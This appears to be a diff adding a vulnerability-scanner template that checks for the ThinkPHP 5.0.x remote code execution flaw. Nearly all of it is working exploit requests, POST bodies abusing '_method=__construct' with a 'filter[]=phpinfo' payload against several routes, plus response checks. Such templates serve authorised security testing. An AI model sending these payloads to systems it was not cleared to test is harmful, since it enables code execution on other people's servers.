@@ -1,0 +1,68 @@
+id: thinkphp-5010-rce
+
+info:
+  name: ThinkPHP 5.0.10 RCE
+  author: zan8in
+  severity: critical
+  description: ThinkPHP <= 5.0.13
+  reference:
+    - https://github.com/Lotus6/ThinkphpGUI/blob/main/ThinkphpGUI/src/main/java/exploit/
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /?s=index
+      body: |
+        s=-1&_method=__construct&method=post&filter[]=phpinfo
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r1:
+    request:
+      method: POST
+      path: /?s=manage
+      body: |
+        s=-1&_method=__construct&method=post&filter[]=phpinfo
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r2:
+    request:
+      method: POST
+      path: /?s=admin
+      body: |
+        s=-1&_method=__construct&method=post&filter[]=phpinfo
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r3:
+    request:
+      method: POST
+      path: /?s=api
+      body: |
+        s=-1&_method=__construct&method=post&filter[]=phpinfo
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r00:
+    request:
+      method: POST
+      path: /?s=index
+      body: |
+        _method=__construct&method=get&filter[]=phpinfo&get[]=-1
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r11:
+    request:
+      method: POST
+      path: /?s=manage
+      body: |
+        _method=__construct&method=get&filter[]=phpinfo&get[]=-1
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r22:
+    request:
+      method: POST
+      path: /?s=admin
+      body: |
+        _method=__construct&method=get&filter[]=phpinfo&get[]=-1
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r33:
+    request:
+      method: POST
+      path: /?s=api
+      body: |
+        _method=__construct&method=get&filter[]=phpinfo&get[]=-1
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0() || r1() || r2() || r3() || r00() || r11() || r22()|| r33()
